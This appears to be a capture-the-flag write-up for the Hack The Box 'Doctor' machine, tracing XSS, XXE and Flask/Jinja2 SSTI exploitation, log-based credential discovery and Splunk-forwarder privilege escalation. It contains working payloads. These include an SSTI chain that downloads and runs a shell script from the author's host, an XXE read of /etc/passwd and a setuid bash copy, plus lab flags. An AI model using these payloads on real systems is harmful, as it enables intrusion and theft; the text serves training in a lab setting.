# Doctor

export IP=10.10.10.209

Lets start with an nmap <br>

cmd: nmap -sC -sV -oN nmap/initial $IP

```
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Did not found anything with gobuster.... <br>

After getting stuck, i went ahead and found a walktrough where it showed the addition of "doctors.htb" to the /etc/hosts file <br>

After we do, we can reach a login form<br>

Tried some SQLi but no luck in there, maybe with more patience, but seems like it does not has that vuln. <br>

Created a new account and started using the platform<br>

The one thing that is possible is the messages posting, i tried some sqli to check database but no luck there. <br>
A curious message in the source code
```
 <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
```

This might indicate that we need to upload something and access the page /archive (nothing there now)<br>

After many time, i decided to check what i got as response when using burp in the archive, and seems that the posts are there and we got that as XML.<br>
The application is not sanitizing the xml which may be an XML injection?!?! <br>

```
XML post structure
<item><title> title text here </title></item>
```

Since it is not sanitized we can do

```
<item><title>    </title> <script> alert("w here"); <script> <title>     </title></item>
```

With this we got the alert which means that we can run JS in this page!!!! <br>

Searching further i found that it is an: <b> XXE injection</b>, i've never heard about! <br>

I need to create an XML entity in order to load a file just to test if it works (i'll use file:///etc/passwd)
```
<!DOCTYPE own [ <!ELEMENT own ANY >
<!ENTITY own SYSTEM "file:///etc/passwd">]>
```

Now i need to create the payload
```
<item><title> 

PAYLOAD:
BEFORE </title></item></channel></rss>

<!DOCTYPE own [ <!ELEMENT own ANY >
<!ENTITY own SYSTEM "file:///etc/passwd">]>

<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>
<item> <title> &own; </title></item>

```
This lead me anywhere, so i went and asked in the forum for hints on this: "Have you identified the server?" <br>

I went ahead and searched that on google: Werkzeug/1.0.1 Python/3.8.2 <br>

So after some research i found out that it can be exploited using SSTI (server side template injection). <br>

First lets check the config.items() in the flask app using the message title: </title> </item> {{ config.items () }}
```
 dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', '1234'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(seconds=43200)), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('MAIL_PASSWORD', 'doctor'), ('MAIL_PORT', 587), ('MAIL_SERVER', ''), ('MAIL_USERNAME', 'doctor'), ('MAIL_USE_TLS', True), ('SQLALCHEMY_DATABASE_URI', 'sqlite://///home/web/blog/flaskblog/site.db'), ('WTF_CSRF_CHECK_DEFAULT', False), ('SQLALCHEMY_BINDS', None), ('SQLALCHEMY_NATIVE_UNICODE', None), ('SQLALCHEMY_ECHO', False), ('SQLALCHEMY_RECORD_QUERIES', None), ('SQLALCHEMY_POOL_SIZE', None), ('SQLALCHEMY_POOL_TIMEOUT', None), ('SQLALCHEMY_POOL_RECYCLE', None), ('SQLALCHEMY_MAX_OVERFLOW', None), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False), ('SQLALCHEMY_TRACK_MODIFICATIONS', None), ('SQLALCHEMY_ENGINE_OPTIONS', {})]) 
```
For the exploit to work we need to create an object through the vuln to go up in the object tree (through the __mro__) 

```
</title> </item> {{ "".__class__.__mro__ }} (empty string str obj )
```

Now check the root object 
```
</title> </item> {{ "".__class__.__mro__[1].__subclasses__() }}

```
Since i need to find something (a library) to leverage this, the ideal would be popen (from subprocess) to launch a new process with a rev shell... and it is on the list (too big to paste here) <br> 

Now just need to figure what is the index of the popen in the returned list from subclasses() <br> can use python slicing with some guessing

```
FIRST: </title> </item> {{"".__class__.__mro__[1].__subclasses__()[284:]}}
FIRST: </title> </item> {{"".__class__.__mro__[1].__subclasses__()[350:]}}


I was tired of this and created a tool to find in the dump. Gave me the exact index.

INDEX: 407
```

Now just need to craft a command line command to make a reverse shell... and it didnt worked.. <br>

Since we now have ways to execute things my idea is to
```
CREATE MESSAGE: Spawn python server and get a bash reverse shell from my pc to machine (mark as executable)
 and run it
</title> </item> {{"".__class__.mro()[1].__subclasses__()[407]("wget http://10.10.15.14:8000/waza_shellz_.sh && chmod +x waza_shellz_.sh && ./waza_shellz_.sh ",shell=True,stdout=-1).communicate()[0].strip()}}


</title> </item> {{"".__class__.mro()[1].__subclasses__()[407]("./waza_shellz_.sh ",shell=True,stdout=-1).communicate()[0].strip()}}

LISTEN with python server and nc

ACCESS ARCHIVE
```

GOT A SHELLL MANNNNNNNNN ! <br>
Make a stable shell and lets go! <br>

In the env there is a path to the db
```
/home/web/blog/flaskblog/site.db
```

Could not make SQLAlchemy to print the contents but as far as i suspect, that is just for the messaging platform which is not relevant.... <br>

Lets run a linpeas to try to escalate to the user<br>

What caught my attention was the ammount of logs that existed in the system which, oddly enough, belong to the group "adm" which the user web is also part of <br>

This and the permissions the logs have make them suspicious. Lets cat them all! <br>

The folder that interest the most is:
- apache2
<br>

Since there is .gz files i'll use zrep to grep on .gz and non gz and pipe that to grep (to highlight) <br>

```
zgrep "password" * | grep password

backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```
Seems like a password reset, lets try as user... <br> it worked ! <br>

```
cat ~/user.txt

FLAG: 1e903fcaeee2421188cac9fc0b773476
```

Lets linpeas again to find the privesc for root!! <br>
Did not found anything interesting besides the splunk being run by root... lets search <br>

```
ps aux | grep -i splunkd

root        1129 13.4  2.6 313092 104916 ?       Sl   11:33  73:50 splunkd -p 8089 start
root        1131  0.0  0.3  77664 15624 ?        Ss   11:33   0:00 [splunkd pid=1129] splunkd -p 8089 start [process-runner]
```

As i found out, if the splunk is running as root its forwards can be abused and thus privesc to the user running the account ! <br>
src: https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/ <br>
Exploit src: https://github.com/cnotin/SplunkWhisperer2 <br>

I was having problems running the exploit remotely so i went ahead and did a local priv esc and just made a link of /bin/bash with chmod +s <br>

```
payload: ln /bin/bash /home/shaun/tmp/rooted; chmod +s /home/shaun/tmp/rooted

rooted -p
whoami
root

cat /root/root.txt
FLAG: 8c97ac3d81b1d7fb48f791f46c011680
```